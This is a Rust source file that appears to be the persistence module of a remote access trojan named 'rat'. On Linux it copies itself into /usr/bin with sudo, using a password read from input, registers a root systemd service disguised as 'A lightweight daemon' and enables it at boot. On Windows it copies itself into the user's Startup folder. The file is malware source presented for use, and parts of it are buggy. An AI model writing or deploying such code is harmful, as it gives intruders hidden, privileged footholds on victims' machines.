use std::{io::Write, path::PathBuf, process::Stdio};

#[allow(unused)]
pub fn startup() {
    if cfg!(target_os = "linux") {
        // grabbing the path of the current running executable
        let current_exe_path = std::env::current_exe().unwrap();

        // copying the executable to the /usr/bin directory
        let password = loop {
            let mut child = std::process::Command::new("sudo")
                .arg("-S")
                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
                .stdin(Stdio::piped())
                .spawn()
                .unwrap();

            let mut s = String::new();
            std::io::stdin().read_line(&mut s).unwrap();
            let _ = child.stdin.as_mut().unwrap().write_all(&s.as_bytes());

            match child.wait_with_output() {
                Ok(op) => {
                    break s;
                }
                Err(e) => {
                    continue;
                }
            }
        };

        let service = "
[Unit]
Description=A lightweight daemon
After=network.target

[Service]
User=root
Group=root
ExecStart=/usr/bin/rat
WorkingDirectory=/var/rat/

[Install]
WantedBy=multi-user.target
        ";

        // creating service file
        let mut child = std::process::Command::new("sudo")
            .args(["touch", "/etc/systemd/system/ratd.service"])
            .stdin(Stdio::piped())
            .spawn()
            .unwrap();

        child.stdin.as_mut().unwrap().write_all(&service.as_bytes());
        child.wait_with_output();

        // enabling service file on startup
        let _ = std::process::Command::new("sudo")
            .args(["systemctl", "enable", "ratd.service"])
            .output()
            .unwrap();
    } else if cfg!(target_os = "windows") {
        let mut user_startup_dir = PathBuf::with_capacity(96);
        user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
        user_startup_dir.push("/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        let current_exe_path = std::env::current_exe().unwrap();
        user_startup_dir.push("rat.exe");
        let _ = std::fs::copy(current_exe_path, user_startup_dir);
    } else if cfg!(target_os = "android") {
    } else if cfg!(target_os = "ios") {
    } else if cfg!(target_os = "macos") {
    }
}

// unsupported systems
// ["aix", "cuda", "dragonfly", "emscripten", "espidf",
// "freebsd", "fuchsia", "haiku", "hermit", "horizon", "hurd",
// "illumos", "l4re", "netbsd", "nto", "openbsd", "psp",
// "redox", "solaris", "solid_asp3", "teeos", "tvos", "uefi",
// "visionos", "vita", "vxworks", "wasi", "watchos"]
